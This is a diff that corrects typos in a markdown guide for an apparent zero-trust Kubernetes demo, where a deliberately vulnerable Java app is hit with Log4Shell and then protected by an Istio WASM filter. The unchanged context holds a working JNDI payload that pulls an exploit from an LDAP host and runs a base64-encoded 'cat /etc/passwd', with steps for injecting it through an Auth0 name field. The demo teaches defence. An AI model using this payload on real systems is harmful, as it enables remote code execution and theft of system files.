@@ -74,7 +74,7 @@ eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkRGRWVyODZqY2lRQTNfUVdETkE3MyJ9.eyJ
 Now we have configured our ingress to require an user login. We could have applied this policy
 directly to the application sidecar, but for the demo purposes we'll do it just at the ingress level.
 
-This means that any other service in the cluster could directly reach the application withot going through
+This means that any other service in the cluster could directly reach the application without going through
 the ingress. We can check it by launching a new pod and accessing the app as follows:
 
 ```bash
@@ -114,7 +114,7 @@ The deployed Java application is vulnerable to `Log4Shell`, as it uses a Java an
 popular CVEs. It logs the information in the JWT token without sanitizing it first, so it is easy to trigger it. To
 demonstrate the attach, let's inject some malicious payloads in the token by setting some claims in our User profile:
 
-* In the Auth0 amnagement console, go to **Users Management > Users**. Select your user and **Edit** the **Name** field.
+* In the Auth0 management console, go to **Users Management > Users**. Select your user and **Edit** the **Name** field.
   Put the following value and save: `${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}`
 * In the browser, go to the `/logout` path to go back to the login screen to get a new token.
 * Log in again. You'll see a normal output:
@@ -162,7 +162,7 @@ demonstrate the attach, let's inject some malicious payloads in the token by set
   08:23:49.537 [qtp1316061703-16] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - user resolved to: pwned!
   ```
 
-At this point, the vulnerable application has processed the mailitious `${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}`
+At this point, the vulnerable application has processed the malicious `${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}`
 payload in the `name` claim of the JWT token, downloaded the exploit from `log4shell:1389`, and executed the `cat /etc/passwd` command
 that comes base64-encoded in the payload.
 
@@ -179,7 +179,7 @@ the mesh to apply the WASM filter to every HTTP request. We can now refresh the 
 Access Denied
 ```
 
-We can check that the sidecar proxy in the application pod is rejecting hte traffic via the WASM plugin we jsut deployed:
+We can check that the sidecar proxy in the application pod is rejecting hte traffic via the WASM plugin we just deployed:
 
 ```bash
 $ kubectl -n zta-demo logs -l app=vulnerable -c istio-proxy | grep wasm
